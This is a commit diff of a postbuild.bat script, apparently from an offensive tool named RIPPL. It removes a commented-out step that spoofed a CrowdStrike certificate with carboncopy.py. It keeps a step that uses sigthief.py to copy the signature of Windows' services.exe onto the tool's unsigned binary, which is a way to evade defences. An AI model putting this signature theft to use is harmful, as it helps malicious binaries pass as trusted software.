063bcfe26f018eb860248c0e16e0effba2e51906
Federico Lagrasta <fed.lag@protonmail.ch>
2022-03-16 23:02:35 +0100

    added cleaning and output in postbuild.bat

--- postbuild.bat
+++ postbuild.bat
@@ -1,4 +1,7 @@
 cd %0\..\
 python3.exe .\restore_headers.py
-rem python3.exe .\carboncopy.py www.crowdstrike.com 443 .\x64\Release\RIPPL_unsigned.exe .\x64\Release\RIPPL.exe
 python3.exe .\sigthief.py -i C:\Windows\System32\services.exe -t .\x64\Release\RIPPL_unsigned.exe -o .\x64\Release\RIPPL.exe
+del .\x64\Release\RIPPL_unsigned.exe
+del .\x64\Release\RIPPLDLL_unencrypted.dll
+del .\x64\Release\RIPPLDLL.dll
+echo [+] Successfully run postbuild.bat
